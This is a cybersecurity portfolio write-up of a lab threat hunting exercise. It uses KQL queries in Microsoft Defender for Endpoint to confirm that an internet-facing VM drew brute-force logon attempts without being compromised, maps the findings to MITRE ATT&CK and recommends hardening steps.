+For this exercise, I worked with a VM in my environment, `nick-test-vm-md`, and the account of interest was `nick-labuser`. This project demonstrates my ability to use advanced hunting queries, analyze telemetry, apply the MITRE ATT&CK framework, and document findings in a professional format.
+
+## Scenario Overview
+
+### Context
+
+During routine maintenance, the security team was tasked with investigating any VMs in the shared services cluster (DNS, Domain Services, DHCP, etc.) that were mistakenly exposed to the internet. The goal was to:
+
+- Identify misconfigured VMs exposed to the public internet
+- Investigate brute-force login attempts or successes
+- Validate whether unauthorized access took place
+- Document findings, map them to MITRE ATT&CK TTPs, and propose improvements
+
+## Investigation Process and Findings
+
+### Internet-Facing Device Check
+
+The first step was to verify which devices were exposed to the internet. Using MDE's DeviceInfo table, I confirmed that the VM `nick-test-vm-md` had been internet-facing for several days.
+
+-------------------------------------------------------
+
+kql
+DeviceInfo
+| where DeviceName == "nick-test-vm-md"
+| where IsInternetFacing == true
+| order by Timestamp desc
+
+
+-------------------------------------------------------
+
+**Result**: Confirmed that nick-test-vm-md was indeed internet-facing, which posed a significant security risk.
+
+<InlineGallery images={internet-facing-device-investigation} title="Internet-Facing Device Investigation Process" />
+
+### Failed Login Attempts Analysis
+
+Next, I investigated failed login attempts to identify potential brute-force attacks targeting the exposed VM.
+
+-------------------------------------------------------
+
+kql
+DeviceLogonEvents
+| where DeviceName == "nick-test-vm-md"
+| where LogonType has_any("Network", "Interactive", "RemoteInteractive", "Unlock")
+| where ActionType == "LogonFailed"
+| where isnotempty(RemoteIP)
+| summarize Attempts = count() by ActionType, RemoteIP, DeviceName
+| order by Attempts desc
+
+
+-------------------------------------------------------
+
+**Findings**: Multiple bad actors attempted to log into nick-test-vm-md from various external IP addresses, indicating clear evidence of brute-force attempts.
+
+<InlineGallery images={brute-force-analysis} title="Brute Force Attack Analysis" />
+
+### Validation of Brute Force Success Attempts
+
+To determine if any of the persistent attackers succeeded, I checked whether the top malicious IPs were able to gain unauthorized access.
+
+-------------------------------------------------------
+
+kql
+let RemoteIPsInQuestion = dynamic(["84.38.185.58","91.203.60.30", "171.254.92.66", "14.169.16.183", "185.243.96.107", "102.88.21.213", "62.60.136.105"]);
+DeviceLogonEvents
+| where LogonType has_any("Network","Interactive","RemoteInteractive","Unlock")
+| where ActionType == "LogonSuccess"
+| where RemoteIP has_any(RemoteIPsInQuestion)
+
+
+-------------------------------------------------------
+
+**Result**: No successful logons were found from any of the malicious IP addresses.
+
+<InlineGallery images={malicious-ip-validation} title="Malicious IP Validation Analysis" />
+
+### Account-Specific Analysis
+
+I then focused on the legitimate account nick-labuser to analyze its authentication patterns.
+
+#### Failed Logons for nick-labuser
+
+-------------------------------------------------------
+
+kql
+DeviceLogonEvents
+| where DeviceName == "nick-test-vm-md"
+| where LogonType == "Network"
+| where ActionType == "LogonFailed"
+| where AccountName == "nick-labuser"
+| summarize count()
+
+
+-------------------------------------------------------
+
+**Result**: 0 failed logon attempts for the `nick-labuser` account, making brute-force success unlikely.
+
+<InlineGallery images={account-failed-logons} title="Account Failed Logons Analysis" />
+
+#### Successful Logons for nick-labuser
+
+-------------------------------------------------------
+
+kql
+DeviceLogonEvents
+| where DeviceName == "nick-test-vm-md"
+| where LogonType == "Network"
+| where ActionType == "LogonSuccess"
+| where AccountName == "nick-labuser"
+| summarize LoginCount = count() by DeviceName, ActionType, AccountName, RemoteIP
+
+
+-------------------------------------------------------
+
+**Findings**: 18 total successful logons, all from consistent, legitimate IP addresses with no signs of compromise.
+
+<InlineGallery images={account-successful-logons} title="Account Successful Logons Analysis" />
+
+## Analysis
+
+### Key Findings
+
+1. Device Exposure: The VM nick-test-vm-md was confirmed to be internet-facing for several days
+2. Brute Force Activity: Clear evidence of multiple failed login attempts from external malicious IPs
+3. No Successful Compromise: Despite persistent attacks, no unauthorized access was achieved
+4. Legitimate Account Security: The nick-labuser account showed no signs of compromise with 18 successful logons from legitimate IPs
+
+### Security Assessment
+
+Though nick-test-vm-md was internet-facing and subjected to clear brute-force attempts, there is no evidence of successful brute force or unauthorized access:
+
+1. The legitimate account nick-labuser showed 18 successful logins, all from valid IPs
+2. No failed logons were associated with nick-labuser
+3. No malicious IPs were able to gain access
+
+## MITRE ATT&CK Framework Mapping
+
+This investigation identified several relevant MITRE ATT&CK techniques:
+
+1. T1190 – Exploit Public-Facing Application: The internet-facing VM represented a potential attack vector
+2. T1078 – Valid Accounts: Legitimate logons by nick-labuser demonstrated normal account usage
+3. T1110 – Brute Force: Multiple failed attempts from external IPs constituted brute-force attacks
+4. T1587.001 – Develop Capabilities: Exploit Code: Inference from multiple bad actors attempting access suggests organized attack attempts
+
+## Response Recommendations
+
+If this were a real enterprise environment, the following actions should be implemented:
+
+1. Network Security: Restrict inbound access via Network Security Groups (NSGs) to only trusted IPs
+2. Multi-Factor Authentication: Enforce MFA on critical accounts such as nick-labuser
+3. Account Lockout Policy: Implement an account lockout policy to prevent unlimited login attempts
+4. Continuous Monitoring: Monitor failed login telemetry continuously for early detection
+
+## Improvement & Reflection
+
+### Lessons Learned
+
+1. VM Hardening: Strengthen VM hardening by default to avoid unnecessary public exposure
+2. Query Efficiency: Improve efficiency of hunting queries by pre-building templates for repeated use
+3. Investigation Workflow: Enhance investigation workflow with automated enrichment of IP reputation and geolocation
+
+### Professional Development
+
+This threat hunting exercise demonstrates the process of validating whether an exposed VM has been compromised. Even though nick-test-vm-md was subject to persistent brute-force attempts, proper analysis confirmed no successful intrusion.
+
+Regular hunts like this not only uncover potential misconfigurations but also build proactive defense habits, mapping every finding against MITRE ATT&CK to ensure structured threat coverage.
+
+## Conclusion
+
+This scenario provided valuable hands-on experience with enterprise-grade security tools and real-world threat hunting methodologies. The systematic approach to investigation, from initial discovery through detailed analysis and documentation, mirrors the processes used in professional SOC environments.
+
+The successful identification and analysis of the brute-force attempts, combined with the validation that no compromise occurred, demonstrates the importance of thorough investigation and proper security controls. This experience reinforces the value of continuous monitoring, proper network segmentation, and the application of structured frameworks like MITRE ATT&CK in cybersecurity investigations.
+9:["$","$L12",null,{"projectData":{"slug":"project-5-2-log-n-pacific-internship-threat-hunting-scenario2","title":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","description":"A comprehensive threat hunting exercise investigating sudden network performance degradation caused by internal port scanning activity, using Microsoft Defender for Endpoint to identify unauthorized reconnaissance within the network.","date":"2025-10-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Network Security","Port Scanning","EDR","KQL","PowerShell"],"content":"$13","image":"/images/projects/Windows Defender Fir..._imresizer.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","order":2}},"relatedProjects":[{"slug":"project-5-3-log-n-pacific-internship-threat-hunting-scenario3","title":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","description":"A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network.","date":"2025-10-20","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Data Exfiltration","Insider Threat","EDR","KQL","PowerShell"],"content":"$14","image":"/images/projects/Suspected Data Exfiltration.jpeg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","order":3}},{"slug":"project-4-5-caldera-security-onion-deployment","title":"Project 4.5: Caldera & Security Onion Deployment in my Cybersecurity Home Lab","description":"Deploying MITRE Caldera for adversary emulation and Security Onion for network-based detection and threat hunting in my cybersecurity home lab.","date":"2025-08-08","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Caldera","Security Onion","MITRE","Adversary Emulation","Threat Hunting","SOC","Network Security","Blue Team","Red Team"],"content":"$15","image":"/images/projects/hardware-lab/Caldera and security onion.png","technologies":[],"images":[],"series":"hardware-lab"},{"slug":"project-5-1-log-n-pacific-internship-threat-hunting-scenario1","title":"Project 5.1: LOG(N) Pacific Internship: Threat Hunting Scenario 1: Devices Exposed to the Internet","description":"A comprehensive threat hunting exercise investigating devices accidentally exposed to the internet, using Microsoft Defender for Endpoint and Microsoft 365 Security suite to analyze brute-force attempts and validate unauthorized access.","date":"2025-09-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Blue Team","Threat Hunting","Microsoft Security","Incident Response","Brute Force Analysis","Security Investigation","MDE"],"content":"$16","image":"/images/projects/MDE image.png","technologies":["Microsoft Defender for Endpoint","Microsoft 365 Security","Advanced Hunting Queries","MITRE ATT&CK","Threat Hunting","Incident Response"],"images":[],"series":{"name":"Project 5.1: LOG(N) Pacific Internship: Threat Hunting Scenario 1: Devices Exposed to the Internet","part":1,"totalParts":1}}],"categoryCounts":{"blue":45,"Infrastructure":3,"red":1}}]
+e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
+b:null
+c:null
+10:[["$","title","0",{"children":"Samson's | Cybersecurity Portfolio"}],["$","meta","1",{"name":"description","content":"Professional cybersecurity portfolio showcasing expertise in digital security"}],["$","meta","2",{"name":"generator","content":"v0.dev"}],["$","link","3",{"rel":"icon","href":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png"}]]
